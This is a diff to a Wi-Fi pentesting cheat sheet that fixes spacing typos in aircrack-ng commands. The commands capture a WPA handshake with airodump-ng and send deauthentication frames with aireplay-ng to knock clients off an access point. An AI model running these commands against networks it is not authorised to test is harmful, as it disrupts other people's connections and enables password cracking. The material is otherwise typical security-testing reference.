@@ -102,19 +102,19 @@ sudo airodump-ng --band a <ESSID> <INTERFACE>mon
 
 Listen for handshake of specified AP
 ```c
-asudoirodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTPUT_PATH> <INTERFACE>mon
+sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTPUT_PATH> <INTERFACE>mon
 ```
 
 **Deauth clients (force handshake)**
 
 Deauth all (broadcast)
 ```c
-sudoaireplay-ng -0 1 -a <BSSID> <INTERFACE>mon
+sudo aireplay-ng -0 1 -a <BSSID> <INTERFACE>mon
 ```
 
 Deauth client
 ```c
-sudoaireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon
+sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon
 ```
 
 Verify captured handshake
